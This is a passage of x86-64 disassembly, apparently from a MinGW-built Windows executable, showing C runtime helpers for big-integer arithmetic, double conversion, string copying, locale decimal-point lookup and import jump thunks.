  40a26a:	45 09 da             	or     %r11d,%r10d
  40a26d:	45 89 11             	mov    %r10d,(%r9)
  40a270:	45 8b 18             	mov    (%r8),%r11d
  40a273:	49 83 c0 04          	add    $0x4,%r8
  40a277:	49 83 c1 04          	add    $0x4,%r9
  40a27b:	41 d3 eb             	shr    %cl,%r11d
  40a27e:	4c 39 c6             	cmp    %r8,%rsi
  40a281:	77 dd                	ja     0x40a260
  40a283:	41 83 c4 02          	add    $0x2,%r12d
  40a287:	45 85 db             	test   %r11d,%r11d
  40a28a:	45 89 19             	mov    %r11d,(%r9)
  40a28d:	41 0f 45 dc          	cmovne %r12d,%ebx
  40a291:	83 eb 01             	sub    $0x1,%ebx
  40a294:	48 89 f9             	mov    %rdi,%rcx
  40a297:	89 5d 14             	mov    %ebx,0x14(%rbp)
  40a29a:	e8 91 fb ff ff       	call   0x409e30
  40a29f:	48 89 e8             	mov    %rbp,%rax
  40a2a2:	48 83 c4 28          	add    $0x28,%rsp
  40a2a6:	5b                   	pop    %rbx
  40a2a7:	5e                   	pop    %rsi
  40a2a8:	5f                   	pop    %rdi
  40a2a9:	5d                   	pop    %rbp
  40a2aa:	41 5c                	pop    %r12
  40a2ac:	41 5d                	pop    %r13
  40a2ae:	c3                   	ret
  40a2af:	90                   	nop
  40a2b0:	41 8b 10             	mov    (%r8),%edx
  40a2b3:	49 83 c0 04          	add    $0x4,%r8
  40a2b7:	41 89 11             	mov    %edx,(%r9)
  40a2ba:	49 83 c1 04          	add    $0x4,%r9
  40a2be:	4c 39 c6             	cmp    %r8,%rsi
  40a2c1:	77 ed                	ja     0x40a2b0
  40a2c3:	eb cc                	jmp    0x40a291
  40a2c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40a2cc:	00 00 00 00 
  40a2d0:	4c 63 4a 14          	movslq 0x14(%rdx),%r9
  40a2d4:	8b 41 14             	mov    0x14(%rcx),%eax
  40a2d7:	44 29 c8             	sub    %r9d,%eax
  40a2da:	75 2b                	jne    0x40a307
  40a2dc:	4e 8d 0c 8d 10 00 00 	lea    0x10(,%r9,4),%r9
  40a2e3:	00 
  40a2e4:	4c 8d 41 18          	lea    0x18(%rcx),%r8
  40a2e8:	4a 8d 54 0a 08       	lea    0x8(%rdx,%r9,1),%rdx
  40a2ed:	4a 8d 4c 09 08       	lea    0x8(%rcx,%r9,1),%rcx
  40a2f2:	48 83 ea 04          	sub    $0x4,%rdx
  40a2f6:	48 83 e9 04          	sub    $0x4,%rcx
  40a2fa:	44 8b 0a             	mov    (%rdx),%r9d
  40a2fd:	44 39 09             	cmp    %r9d,(%rcx)
  40a300:	75 0e                	jne    0x40a310
  40a302:	49 39 c8             	cmp    %rcx,%r8
  40a305:	72 eb                	jb     0x40a2f2
  40a307:	f3 c3                	repz ret
  40a309:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40a310:	19 c0                	sbb    %eax,%eax
  40a312:	83 c8 01             	or     $0x1,%eax
  40a315:	c3                   	ret
  40a316:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40a31d:	00 00 00 
  40a320:	57                   	push   %rdi
  40a321:	56                   	push   %rsi
  40a322:	53                   	push   %rbx
  40a323:	48 83 ec 20          	sub    $0x20,%rsp
  40a327:	48 89 cb             	mov    %rcx,%rbx
  40a32a:	48 89 d7             	mov    %rdx,%rdi
  40a32d:	e8 9e ff ff ff       	call   0x40a2d0
  40a332:	83 f8 00             	cmp    $0x0,%eax
  40a335:	0f 84 e5 00 00 00    	je     0x40a420
  40a33b:	0f 8c 01 01 00 00    	jl     0x40a442
  40a341:	31 f6                	xor    %esi,%esi
  40a343:	8b 4b 08             	mov    0x8(%rbx),%ecx
  40a346:	e8 05 fa ff ff       	call   0x409d50
  40a34b:	48 85 c0             	test   %rax,%rax
  40a34e:	0f 84 01 01 00 00    	je     0x40a455
  40a354:	44 8b 5b 14          	mov    0x14(%rbx),%r11d
  40a358:	89 70 10             	mov    %esi,0x10(%rax)
  40a35b:	4c 8d 43 18          	lea    0x18(%rbx),%r8
  40a35f:	4c 8d 48 18          	lea    0x18(%rax),%r9
  40a363:	4c 8d 57 18          	lea    0x18(%rdi),%r10
  40a367:	49 63 d3             	movslq %r11d,%rdx
  40a36a:	48 8d 74 93 18       	lea    0x18(%rbx,%rdx,4),%rsi
  40a36f:	48 63 57 14          	movslq 0x14(%rdi),%rdx
  40a373:	48 8d 7c 97 18       	lea    0x18(%rdi,%rdx,4),%rdi
  40a378:	31 d2                	xor    %edx,%edx
  40a37a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a380:	41 8b 1a             	mov    (%r10),%ebx
  40a383:	41 8b 08             	mov    (%r8),%ecx
  40a386:	49 83 c2 04          	add    $0x4,%r10
  40a38a:	49 83 c0 04          	add    $0x4,%r8
  40a38e:	48 29 d9             	sub    %rbx,%rcx
  40a391:	48 29 d1             	sub    %rdx,%rcx
  40a394:	48 89 ca             	mov    %rcx,%rdx
  40a397:	41 89 09             	mov    %ecx,(%r9)
  40a39a:	49 83 c1 04          	add    $0x4,%r9
  40a39e:	48 c1 ea 20          	shr    $0x20,%rdx
  40a3a2:	89 cb                	mov    %ecx,%ebx
  40a3a4:	83 e2 01             	and    $0x1,%edx
  40a3a7:	4c 39 d7             	cmp    %r10,%rdi
  40a3aa:	77 d4                	ja     0x40a380
  40a3ac:	4c 39 c6             	cmp    %r8,%rsi
  40a3af:	4d 89 ca             	mov    %r9,%r10
  40a3b2:	4c 89 c7             	mov    %r8,%rdi
  40a3b5:	76 3b                	jbe    0x40a3f2
  40a3b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40a3be:	00 00 
  40a3c0:	41 8b 08             	mov    (%r8),%ecx
  40a3c3:	49 83 c0 04          	add    $0x4,%r8
  40a3c7:	48 29 d1             	sub    %rdx,%rcx
  40a3ca:	48 89 ca             	mov    %rcx,%rdx
  40a3cd:	41 89 09             	mov    %ecx,(%r9)
  40a3d0:	49 83 c1 04          	add    $0x4,%r9
  40a3d4:	48 c1 ea 20          	shr    $0x20,%rdx
  40a3d8:	89 cb                	mov    %ecx,%ebx
  40a3da:	83 e2 01             	and    $0x1,%edx
  40a3dd:	4c 39 c6             	cmp    %r8,%rsi
  40a3e0:	77 de                	ja     0x40a3c0
  40a3e2:	48 f7 d7             	not    %rdi
  40a3e5:	48 8d 14 37          	lea    (%rdi,%rsi,1),%rdx
  40a3e9:	48 c1 ea 02          	shr    $0x2,%rdx
  40a3ed:	4d 8d 4c 92 04       	lea    0x4(%r10,%rdx,4),%r9
  40a3f2:	49 83 e9 04          	sub    $0x4,%r9
  40a3f6:	85 db                	test   %ebx,%ebx
  40a3f8:	75 16                	jne    0x40a410
  40a3fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a400:	49 83 e9 04          	sub    $0x4,%r9
  40a404:	41 83 eb 01          	sub    $0x1,%r11d
  40a408:	45 8b 11             	mov    (%r9),%r10d
  40a40b:	45 85 d2             	test   %r10d,%r10d
  40a40e:	74 f0                	je     0x40a400
  40a410:	44 89 58 14          	mov    %r11d,0x14(%rax)
  40a414:	48 83 c4 20          	add    $0x20,%rsp
  40a418:	5b                   	pop    %rbx
  40a419:	5e                   	pop    %rsi
  40a41a:	5f                   	pop    %rdi
  40a41b:	c3                   	ret
  40a41c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a420:	31 c9                	xor    %ecx,%ecx
  40a422:	e8 29 f9 ff ff       	call   0x409d50
  40a427:	48 85 c0             	test   %rax,%rax
  40a42a:	74 29                	je     0x40a455
  40a42c:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  40a433:	c7 40 18 00 00 00 00 	movl   $0x0,0x18(%rax)
  40a43a:	48 83 c4 20          	add    $0x20,%rsp
  40a43e:	5b                   	pop    %rbx
  40a43f:	5e                   	pop    %rsi
  40a440:	5f                   	pop    %rdi
  40a441:	c3                   	ret
  40a442:	48 89 d8             	mov    %rbx,%rax
  40a445:	be 01 00 00 00       	mov    $0x1,%esi
  40a44a:	48 89 fb             	mov    %rdi,%rbx
  40a44d:	48 89 c7             	mov    %rax,%rdi
  40a450:	e9 ee fe ff ff       	jmp    0x40a343
  40a455:	31 c0                	xor    %eax,%eax
  40a457:	eb bb                	jmp    0x40a414
  40a459:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40a460:	56                   	push   %rsi
  40a461:	53                   	push   %rbx
  40a462:	48 83 ec 18          	sub    $0x18,%rsp
  40a466:	48 63 41 14          	movslq 0x14(%rcx),%rax
  40a46a:	41 b8 20 00 00 00    	mov    $0x20,%r8d
  40a470:	48 8d 71 18          	lea    0x18(%rcx),%rsi
  40a474:	4c 8d 54 81 10       	lea    0x10(%rcx,%rax,4),%r10
  40a479:	49 8d 5a 08          	lea    0x8(%r10),%rbx
  40a47d:	4d 8d 5a 04          	lea    0x4(%r10),%r11
  40a481:	44 8b 4b fc          	mov    -0x4(%rbx),%r9d
  40a485:	41 0f bd c1          	bsr    %r9d,%eax
  40a489:	83 f0 1f             	xor    $0x1f,%eax
  40a48c:	41 29 c0             	sub    %eax,%r8d
  40a48f:	83 f8 0a             	cmp    $0xa,%eax
  40a492:	44 89 02             	mov    %r8d,(%rdx)
  40a495:	7f 49                	jg     0x40a4e0
  40a497:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a49c:	44 89 ca             	mov    %r9d,%edx
  40a49f:	45 31 c0             	xor    %r8d,%r8d
  40a4a2:	29 c1                	sub    %eax,%ecx
  40a4a4:	d3 ea                	shr    %cl,%edx
  40a4a6:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
  40a4ac:	48 c1 e2 20          	shl    $0x20,%rdx
  40a4b0:	4c 39 de             	cmp    %r11,%rsi
  40a4b3:	73 07                	jae    0x40a4bc
  40a4b5:	44 8b 43 f8          	mov    -0x8(%rbx),%r8d
  40a4b9:	41 d3 e8             	shr    %cl,%r8d
  40a4bc:	8d 48 15             	lea    0x15(%rax),%ecx
  40a4bf:	44 89 c8             	mov    %r9d,%eax
  40a4c2:	d3 e0                	shl    %cl,%eax
  40a4c4:	44 09 c0             	or     %r8d,%eax
  40a4c7:	48 09 d0             	or     %rdx,%rax
  40a4ca:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
  40a4cf:	f2 0f 10 44 24 08    	movsd  0x8(%rsp),%xmm0
  40a4d5:	48 83 c4 18          	add    $0x18,%rsp
  40a4d9:	5b                   	pop    %rbx
  40a4da:	5e                   	pop    %rsi
  40a4db:	c3                   	ret
  40a4dc:	0f 1f 40 00          	nopl   0x0(%rax)
  40a4e0:	31 d2                	xor    %edx,%edx
  40a4e2:	4c 39 de             	cmp    %r11,%rsi
  40a4e5:	73 06                	jae    0x40a4ed
  40a4e7:	8b 53 f8             	mov    -0x8(%rbx),%edx
  40a4ea:	4d 89 d3             	mov    %r10,%r11
  40a4ed:	41 89 c2             	mov    %eax,%r10d
  40a4f0:	41 83 ea 0b          	sub    $0xb,%r10d
  40a4f4:	74 3f                	je     0x40a535
  40a4f6:	41 b8 2b 00 00 00    	mov    $0x2b,%r8d
  40a4fc:	44 89 d1             	mov    %r10d,%ecx
  40a4ff:	31 db                	xor    %ebx,%ebx
  40a501:	41 29 c0             	sub    %eax,%r8d
  40a504:	41 d3 e1             	shl    %cl,%r9d
  40a507:	89 d0                	mov    %edx,%eax
  40a509:	44 89 c1             	mov    %r8d,%ecx
  40a50c:	41 81 c9 00 00 f0 3f 	or     $0x3ff00000,%r9d
  40a513:	d3 e8                	shr    %cl,%eax
  40a515:	41 09 c1             	or     %eax,%r9d
  40a518:	49 c1 e1 20          	shl    $0x20,%r9
  40a51c:	49 39 f3             	cmp    %rsi,%r11
  40a51f:	76 06                	jbe    0x40a527
  40a521:	41 8b 5b fc          	mov    -0x4(%r11),%ebx
  40a525:	d3 eb                	shr    %cl,%ebx
  40a527:	89 d0                	mov    %edx,%eax
  40a529:	44 89 d1             	mov    %r10d,%ecx
  40a52c:	d3 e0                	shl    %cl,%eax
  40a52e:	09 d8                	or     %ebx,%eax
  40a530:	4c 09 c8             	or     %r9,%rax
  40a533:	eb 95                	jmp    0x40a4ca
  40a535:	44 89 c8             	mov    %r9d,%eax
  40a538:	0d 00 00 f0 3f       	or     $0x3ff00000,%eax
  40a53d:	48 c1 e0 20          	shl    $0x20,%rax
  40a541:	48 09 d0             	or     %rdx,%rax
  40a544:	eb 84                	jmp    0x40a4ca
  40a546:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40a54d:	00 00 00 
  40a550:	57                   	push   %rdi
  40a551:	56                   	push   %rsi
  40a552:	53                   	push   %rbx
  40a553:	48 83 ec 30          	sub    $0x30,%rsp
  40a557:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a55c:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  40a562:	48 89 d7             	mov    %rdx,%rdi
  40a565:	4c 89 c6             	mov    %r8,%rsi
  40a568:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
  40a56d:	e8 de f7 ff ff       	call   0x409d50
  40a572:	48 85 c0             	test   %rax,%rax
  40a575:	0f 84 8d 00 00 00    	je     0x40a608
  40a57b:	49 89 da             	mov    %rbx,%r10
  40a57e:	49 c1 ea 20          	shr    $0x20,%r10
  40a582:	45 89 d1             	mov    %r10d,%r9d
  40a585:	41 81 e2 ff ff ff 7f 	and    $0x7fffffff,%r10d
  40a58c:	41 81 e1 ff ff 0f 00 	and    $0xfffff,%r9d
  40a593:	41 c1 ea 14          	shr    $0x14,%r10d
  40a597:	44 89 ca             	mov    %r9d,%edx
  40a59a:	81 ca 00 00 10 00    	or     $0x100000,%edx
  40a5a0:	45 85 d2             	test   %r10d,%r10d
  40a5a3:	44 0f 45 ca          	cmovne %edx,%r9d
  40a5a7:	85 db                	test   %ebx,%ebx
  40a5a9:	74 65                	je     0x40a610
  40a5ab:	44 0f bc db          	bsf    %ebx,%r11d
  40a5af:	44 89 d9             	mov    %r11d,%ecx
  40a5b2:	d3 eb                	shr    %cl,%ebx
  40a5b4:	45 85 db             	test   %r11d,%r11d
  40a5b7:	0f 84 93 00 00 00    	je     0x40a650
  40a5bd:	b9 20 00 00 00       	mov    $0x20,%ecx
  40a5c2:	44 89 ca             	mov    %r9d,%edx
  40a5c5:	44 29 d9             	sub    %r11d,%ecx
  40a5c8:	d3 e2                	shl    %cl,%edx
  40a5ca:	89 d1                	mov    %edx,%ecx
  40a5cc:	09 d9                	or     %ebx,%ecx
  40a5ce:	89 48 18             	mov    %ecx,0x18(%rax)
  40a5d1:	44 89 d9             	mov    %r11d,%ecx
  40a5d4:	41 d3 e9             	shr    %cl,%r9d
  40a5d7:	41 83 f9 01          	cmp    $0x1,%r9d
  40a5db:	44 89 48 1c          	mov    %r9d,0x1c(%rax)
  40a5df:	19 c9                	sbb    %ecx,%ecx
  40a5e1:	83 c1 02             	add    $0x2,%ecx
  40a5e4:	45 85 d2             	test   %r10d,%r10d
  40a5e7:	89 48 14             	mov    %ecx,0x14(%rax)
  40a5ea:	75 44                	jne    0x40a630
  40a5ec:	48 63 d1             	movslq %ecx,%rdx
  40a5ef:	c1 e1 05             	shl    $0x5,%ecx
  40a5f2:	41 81 eb 32 04 00 00 	sub    $0x432,%r11d
  40a5f9:	0f bd 54 90 14       	bsr    0x14(%rax,%rdx,4),%edx
  40a5fe:	44 89 1f             	mov    %r11d,(%rdi)
  40a601:	83 f2 1f             	xor    $0x1f,%edx
  40a604:	29 d1                	sub    %edx,%ecx
  40a606:	89 0e                	mov    %ecx,(%rsi)
  40a608:	48 83 c4 30          	add    $0x30,%rsp
  40a60c:	5b                   	pop    %rbx
  40a60d:	5e                   	pop    %rsi
  40a60e:	5f                   	pop    %rdi
  40a60f:	c3                   	ret
  40a610:	41 0f bc c9          	bsf    %r9d,%ecx
  40a614:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
  40a61b:	41 d3 e9             	shr    %cl,%r9d
  40a61e:	45 85 d2             	test   %r10d,%r10d
  40a621:	44 8d 59 20          	lea    0x20(%rcx),%r11d
  40a625:	44 89 48 18          	mov    %r9d,0x18(%rax)
  40a629:	b9 01 00 00 00       	mov    $0x1,%ecx
  40a62e:	74 bc                	je     0x40a5ec
  40a630:	43 8d 94 13 cd fb ff 	lea    -0x433(%r11,%r10,1),%edx
  40a637:	ff 
  40a638:	89 17                	mov    %edx,(%rdi)
  40a63a:	ba 35 00 00 00       	mov    $0x35,%edx
  40a63f:	44 29 da             	sub    %r11d,%edx
  40a642:	89 16                	mov    %edx,(%rsi)
  40a644:	48 83 c4 30          	add    $0x30,%rsp
  40a648:	5b                   	pop    %rbx
  40a649:	5e                   	pop    %rsi
  40a64a:	5f                   	pop    %rdi
  40a64b:	c3                   	ret
  40a64c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a650:	89 58 18             	mov    %ebx,0x18(%rax)
  40a653:	eb 82                	jmp    0x40a5d7
  40a655:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  40a65c:	00 00 00 00 
  40a660:	48 89 c8             	mov    %rcx,%rax
  40a663:	eb 04                	jmp    0x40a669
  40a665:	48 83 c0 01          	add    $0x1,%rax
  40a669:	0f b6 0a             	movzbl (%rdx),%ecx
  40a66c:	48 83 c2 01          	add    $0x1,%rdx
  40a670:	84 c9                	test   %cl,%cl
  40a672:	88 08                	mov    %cl,(%rax)
  40a674:	75 ef                	jne    0x40a665
  40a676:	f3 c3                	repz ret
  40a678:	90                   	nop
  40a679:	90                   	nop
  40a67a:	90                   	nop
  40a67b:	90                   	nop
  40a67c:	90                   	nop
  40a67d:	90                   	nop
  40a67e:	90                   	nop
  40a67f:	90                   	nop
  40a680:	55                   	push   %rbp
  40a681:	57                   	push   %rdi
  40a682:	56                   	push   %rsi
  40a683:	53                   	push   %rbx
  40a684:	48 89 cb             	mov    %rcx,%rbx
  40a687:	48 8d 79 18          	lea    0x18(%rcx),%rdi
  40a68b:	48 63 49 14          	movslq 0x14(%rcx),%rcx
  40a68f:	89 d0                	mov    %edx,%eax
  40a691:	c1 f8 05             	sar    $0x5,%eax
  40a694:	39 c8                	cmp    %ecx,%eax
  40a696:	0f 8d 84 00 00 00    	jge    0x40a720
  40a69c:	48 98                	cltq
  40a69e:	4c 8d 5c 8b 18       	lea    0x18(%rbx,%rcx,4),%r11
  40a6a3:	48 83 c0 04          	add    $0x4,%rax
  40a6a7:	83 e2 1f             	and    $0x1f,%edx
  40a6aa:	4c 8d 04 83          	lea    (%rbx,%rax,4),%r8
  40a6ae:	49 8d 68 08          	lea    0x8(%r8),%rbp
  40a6b2:	74 7f                	je     0x40a733
  40a6b4:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
  40a6b9:	be 20 00 00 00       	mov    $0x20,%esi
  40a6be:	89 d1                	mov    %edx,%ecx
  40a6c0:	49 83 c0 0c          	add    $0xc,%r8
  40a6c4:	29 d6                	sub    %edx,%esi
  40a6c6:	41 d3 e9             	shr    %cl,%r9d
  40a6c9:	4d 39 c3             	cmp    %r8,%r11
  40a6cc:	0f 86 a3 00 00 00    	jbe    0x40a775
  40a6d2:	49 89 fa             	mov    %rdi,%r10
  40a6d5:	41 8b 00             	mov    (%r8),%eax
  40a6d8:	89 f1                	mov    %esi,%ecx
  40a6da:	d3 e0                	shl    %cl,%eax
  40a6dc:	89 d1                	mov    %edx,%ecx
  40a6de:	44 09 c8             	or     %r9d,%eax
  40a6e1:	41 89 02             	mov    %eax,(%r10)
  40a6e4:	45 8b 08             	mov    (%r8),%r9d
  40a6e7:	49 83 c0 04          	add    $0x4,%r8
  40a6eb:	49 83 c2 04          	add    $0x4,%r10
  40a6ef:	41 d3 e9             	shr    %cl,%r9d
  40a6f2:	4d 39 c3             	cmp    %r8,%r11
  40a6f5:	77 de                	ja     0x40a6d5
  40a6f7:	49 29 eb             	sub    %rbp,%r11
  40a6fa:	49 8d 43 fb          	lea    -0x5(%r11),%rax
  40a6fe:	48 c1 e8 02          	shr    $0x2,%rax
  40a702:	48 8d 44 83 1c       	lea    0x1c(%rbx,%rax,4),%rax
  40a707:	45 85 c9             	test   %r9d,%r9d
  40a70a:	44 89 08             	mov    %r9d,(%rax)
  40a70d:	74 53                	je     0x40a762
  40a70f:	48 83 c0 04          	add    $0x4,%rax
  40a713:	48 29 f8             	sub    %rdi,%rax
  40a716:	48 c1 e8 02          	shr    $0x2,%rax
  40a71a:	eb 4d                	jmp    0x40a769
  40a71c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a720:	c7 43 14 00 00 00 00 	movl   $0x0,0x14(%rbx)
  40a727:	c7 43 18 00 00 00 00 	movl   $0x0,0x18(%rbx)
  40a72e:	5b                   	pop    %rbx
  40a72f:	5e                   	pop    %rsi
  40a730:	5f                   	pop    %rdi
  40a731:	5d                   	pop    %rbp
  40a732:	c3                   	ret
  40a733:	49 39 eb             	cmp    %rbp,%r11
  40a736:	48 89 fa             	mov    %rdi,%rdx
  40a739:	48 89 e8             	mov    %rbp,%rax
  40a73c:	76 e2                	jbe    0x40a720
  40a73e:	66 90                	xchg   %ax,%ax
  40a740:	8b 08                	mov    (%rax),%ecx
  40a742:	48 83 c0 04          	add    $0x4,%rax
  40a746:	89 0a                	mov    %ecx,(%rdx)
  40a748:	48 83 c2 04          	add    $0x4,%rdx
  40a74c:	49 39 c3             	cmp    %rax,%r11
  40a74f:	77 ef                	ja     0x40a740
  40a751:	48 f7 d5             	not    %rbp
  40a754:	4a 8d 44 1d 00       	lea    0x0(%rbp,%r11,1),%rax
  40a759:	48 c1 e8 02          	shr    $0x2,%rax
  40a75d:	48 8d 44 83 1c       	lea    0x1c(%rbx,%rax,4),%rax
  40a762:	48 29 f8             	sub    %rdi,%rax
  40a765:	48 c1 e8 02          	shr    $0x2,%rax
  40a769:	85 c0                	test   %eax,%eax
  40a76b:	89 43 14             	mov    %eax,0x14(%rbx)
  40a76e:	74 b7                	je     0x40a727
  40a770:	5b                   	pop    %rbx
  40a771:	5e                   	pop    %rsi
  40a772:	5f                   	pop    %rdi
  40a773:	5d                   	pop    %rbp
  40a774:	c3                   	ret
  40a775:	48 89 f8             	mov    %rdi,%rax
  40a778:	eb 8d                	jmp    0x40a707
  40a77a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a780:	48 63 41 14          	movslq 0x14(%rcx),%rax
  40a784:	48 8d 51 18          	lea    0x18(%rcx),%rdx
  40a788:	4c 8d 44 81 18       	lea    0x18(%rcx,%rax,4),%r8
  40a78d:	4c 39 c2             	cmp    %r8,%rdx
  40a790:	73 28                	jae    0x40a7ba
  40a792:	8b 49 18             	mov    0x18(%rcx),%ecx
  40a795:	31 c0                	xor    %eax,%eax
  40a797:	85 c9                	test   %ecx,%ecx
  40a799:	74 0b                	je     0x40a7a6
  40a79b:	eb 17                	jmp    0x40a7b4
  40a79d:	0f 1f 00             	nopl   (%rax)
  40a7a0:	8b 0a                	mov    (%rdx),%ecx
  40a7a2:	85 c9                	test   %ecx,%ecx
  40a7a4:	75 0e                	jne    0x40a7b4
  40a7a6:	48 83 c2 04          	add    $0x4,%rdx
  40a7aa:	83 c0 20             	add    $0x20,%eax
  40a7ad:	49 39 d0             	cmp    %rdx,%r8
  40a7b0:	77 ee                	ja     0x40a7a0
  40a7b2:	f3 c3                	repz ret
  40a7b4:	0f bc c9             	bsf    %ecx,%ecx
  40a7b7:	01 c8                	add    %ecx,%eax
  40a7b9:	c3                   	ret
  40a7ba:	31 c0                	xor    %eax,%eax
  40a7bc:	0f 1f 40 00          	nopl   0x0(%rax)
  40a7c0:	c3                   	ret
  40a7c1:	90                   	nop
  40a7c2:	90                   	nop
  40a7c3:	90                   	nop
  40a7c4:	90                   	nop
  40a7c5:	90                   	nop
  40a7c6:	90                   	nop
  40a7c7:	90                   	nop
  40a7c8:	90                   	nop
  40a7c9:	90                   	nop
  40a7ca:	90                   	nop
  40a7cb:	90                   	nop
  40a7cc:	90                   	nop
  40a7cd:	90                   	nop
  40a7ce:	90                   	nop
  40a7cf:	90                   	nop
  40a7d0:	48 8b 05 e9 6c 15 00 	mov    0x156ce9(%rip),%rax        # 0x5614c0
  40a7d7:	8b 00                	mov    (%rax),%eax
  40a7d9:	c3                   	ret
  40a7da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a7e0:	48 83 ec 28          	sub    $0x28,%rsp
  40a7e4:	31 d2                	xor    %edx,%edx
  40a7e6:	b9 02 00 00 00       	mov    $0x2,%ecx
  40a7eb:	e8 00 02 00 00       	call   0x40a9f0
  40a7f0:	ba 2e 00 00 00       	mov    $0x2e,%edx
  40a7f5:	48 89 c1             	mov    %rax,%rcx
  40a7f8:	e8 fb 01 00 00       	call   0x40a9f8
  40a7fd:	48 85 c0             	test   %rax,%rax
  40a800:	74 0e                	je     0x40a810
  40a802:	48 8d 48 01          	lea    0x1(%rax),%rcx
  40a806:	48 83 c4 28          	add    $0x28,%rsp
  40a80a:	e9 f1 01 00 00       	jmp    0x40aa00
  40a80f:	90                   	nop
  40a810:	31 c0                	xor    %eax,%eax
  40a812:	48 83 c4 28          	add    $0x28,%rsp
  40a816:	c3                   	ret
  40a817:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40a81e:	00 00 
  40a820:	56                   	push   %rsi
  40a821:	53                   	push   %rbx
  40a822:	48 83 ec 28          	sub    $0x28,%rsp
  40a826:	e8 b5 ad ff ff       	call   0x4055e0
  40a82b:	48 85 c0             	test   %rax,%rax
  40a82e:	48 89 c3             	mov    %rax,%rbx
  40a831:	74 2d                	je     0x40a860
  40a833:	48 8d 15 06 34 15 00 	lea    0x153406(%rip),%rdx        # 0x55dc40
  40a83a:	48 89 c1             	mov    %rax,%rcx
  40a83d:	48 8b 35 48 7d 15 00 	mov    0x157d48(%rip),%rsi        # 0x56258c
  40a844:	ff d6                	call   *%rsi
  40a846:	48 85 c0             	test   %rax,%rax
  40a849:	48 89 05 a0 25 15 00 	mov    %rax,0x1525a0(%rip)        # 0x55cdf0
  40a850:	74 2e                	je     0x40a880
  40a852:	48 83 c4 28          	add    $0x28,%rsp
  40a856:	5b                   	pop    %rbx
  40a857:	5e                   	pop    %rsi
  40a858:	48 ff e0             	rex.W jmp *%rax
  40a85b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40a860:	48 8d 05 79 ff ff ff 	lea    -0x87(%rip),%rax        # 0x40a7e0
  40a867:	48 89 05 82 25 15 00 	mov    %rax,0x152582(%rip)        # 0x55cdf0
  40a86e:	48 83 c4 28          	add    $0x28,%rsp
  40a872:	5b                   	pop    %rbx
  40a873:	5e                   	pop    %rsi
  40a874:	48 ff e0             	rex.W jmp *%rax
  40a877:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40a87e:	00 00 
  40a880:	48 8d 15 cd 33 15 00 	lea    0x1533cd(%rip),%rdx        # 0x55dc54
  40a887:	48 89 d9             	mov    %rbx,%rcx
  40a88a:	ff d6                	call   *%rsi
  40a88c:	48 85 c0             	test   %rax,%rax
  40a88f:	48 89 05 2a 6c 15 00 	mov    %rax,0x156c2a(%rip)        # 0x5614c0
  40a896:	74 c8                	je     0x40a860
  40a898:	8b 00                	mov    (%rax),%eax
  40a89a:	48 8d 15 2f ff ff ff 	lea    -0xd1(%rip),%rdx        # 0x40a7d0
  40a8a1:	48 89 15 48 25 15 00 	mov    %rdx,0x152548(%rip)        # 0x55cdf0
  40a8a8:	48 83 c4 28          	add    $0x28,%rsp
  40a8ac:	5b                   	pop    %rbx
  40a8ad:	5e                   	pop    %rsi
  40a8ae:	c3                   	ret
  40a8af:	90                   	nop
  40a8b0:	ff 25 be 7d 15 00    	jmp    *0x157dbe(%rip)        # 0x562674
  40a8b6:	90                   	nop
  40a8b7:	90                   	nop
  40a8b8:	ff 25 c6 7d 15 00    	jmp    *0x157dc6(%rip)        # 0x562684
  40a8be:	90                   	nop
  40a8bf:	90                   	nop
  40a8c0:	ff 25 e6 7d 15 00    	jmp    *0x157de6(%rip)        # 0x5626ac
  40a8c6:	90                   	nop
  40a8c7:	90                   	nop
  40a8c8:	ff 25 ae 7e 15 00    	jmp    *0x157eae(%rip)        # 0x56277c
  40a8ce:	90                   	nop
  40a8cf:	90                   	nop
  40a8d0:	ff 25 9e 7e 15 00    	jmp    *0x157e9e(%rip)        # 0x562774
  40a8d6:	90                   	nop
  40a8d7:	90                   	nop
  40a8d8:	ff 25 f6 7e 15 00    	jmp    *0x157ef6(%rip)        # 0x5627d4
  40a8de:	90                   	nop
  40a8df:	90                   	nop
  40a8e0:	ff 25 e6 7d 15 00    	jmp    *0x157de6(%rip)        # 0x5626cc
  40a8e6:	90                   	nop
  40a8e7:	90                   	nop
  40a8e8:	ff 25 d6 7d 15 00    	jmp    *0x157dd6(%rip)        # 0x5626c4
  40a8ee:	90                   	nop
  40a8ef:	90                   	nop
  40a8f0:	ff 25 ee 7d 15 00    	jmp    *0x157dee(%rip)        # 0x5626e4
  40a8f6:	90                   	nop
  40a8f7:	90                   	nop
  40a8f8:	ff 25 2e 7e 15 00    	jmp    *0x157e2e(%rip)        # 0x56272c
  40a8fe:	90                   	nop
  40a8ff:	90                   	nop
  40a900:	ff 25 f6 7d 15 00    	jmp    *0x157df6(%rip)        # 0x5626fc
  40a906:	90                   	nop
  40a907:	90                   	nop
  40a908:	ff 25 fe 7d 15 00    	jmp    *0x157dfe(%rip)        # 0x56270c
  40a90e:	90                   	nop
  40a90f:	90                   	nop
